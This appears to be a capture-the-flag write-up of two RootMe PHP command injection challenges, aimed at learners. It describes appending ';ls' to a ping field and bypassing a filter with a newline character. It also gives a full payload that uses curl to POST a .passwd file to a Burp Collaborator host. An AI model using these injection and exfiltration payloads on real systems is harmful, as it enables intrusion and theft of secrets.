# RootMe  – Command Injection Challenges

## 1. PHP - Command injection

/assets/Rootmeimages/osi/image

![alt text](/assets/Rootmeimages/osi/image.png)

**Mission**  
Find a vulnerability in this service and exploit it.  
You must manage to read index.php

**Solution**

1) open challenge and find ping page to localhost :  
![alt text](/assets/Rootmeimages/osi/image-1.png)
 
2) make normal ping request :  
![alt text](/assets/Rootmeimages/osi/image-2.png)

3) put ;ls at the end of ip to check it's injectable or not:  
![alt text](/assets/Rootmeimages/osi/image-3.png)

4) after proof it's injectable add ;ls -lah after ip to see all files :  
![alt text](/assets/Rootmeimages/osi/image-4.png)

5) find file with name .passwd try to cat it and cat not work so that i try more command and it's success :

Finished. Happy Hacking!

## 2. Command injection - Filter bypass

![alt text](/assets/Rootmeimages/osi/image-6.png)

**Mission**  
Find a vulnerability in this service and exploit it. Some protections were added.  
The flag is on the index.php file.

**Solution**

1) open challenge and i find input to ping ip put ip and it's back with ping ok :  
![alt text](/assets/Rootmeimages/osi/image-7.png)

2) add ;ls after ip but it's back with syntax error :  
![alt text](/assets/Rootmeimages/osi/image-8.png)

3) open burp suite and tried payloads after that all i find /n %0a is work and curl is work :  
![alt text](/assets/Rootmeimages/osi/image-9.png)

4) now trying to extract data with curl :  
![alt text](/assets/Rootmeimages/osi/image-10.png)

5) now let's create payload to our challenge i will use burp collab to receive request :  

>|**+0a%+curl+-X+POST+--data+"@.passwd"+e4jl0kjtbe9519gxifjw0lm2yt4ksbg0.oastify.com**

6) open burp collab and i find request to it with data in .passwd .txt :  

![alt text](/assets/Rootmeimages/osi/image-11.png)  
![alt text](/assets/Rootmeimages/osi/image-12.png)

Finished. Happy Hacking!
